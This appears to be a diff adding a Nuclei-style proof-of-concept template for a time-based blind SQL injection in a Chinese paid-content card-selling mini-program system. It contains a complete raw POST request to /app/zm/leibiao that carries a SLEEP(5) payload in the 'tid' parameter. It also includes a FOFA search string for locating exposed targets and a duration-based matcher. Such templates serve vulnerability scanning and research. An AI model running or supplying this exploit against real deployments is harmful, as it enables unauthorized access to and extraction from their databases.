@@ -1,0 +1,61 @@
+id: poc-huxlh2xd7ub65irr
+info:
+  name: 知识付费纯净发卡小程序系统存在前台ZmController存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/huxlh2xd7ub65irr
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: huxlh2xd7ub65irr
+    fofa: '"域名/skdjfdf"'
+http:
+- raw:
+  - 'POST /app/zm/leibiao HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=q7pp0d3p3f5ileeqhnf8v5lnt1
+
+    Connection: close
+
+    Content-Length: 55
+
+
+    tid=(CASE WHEN (3711=3711) THEN SLEEP(5) ELSE 3711 END)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
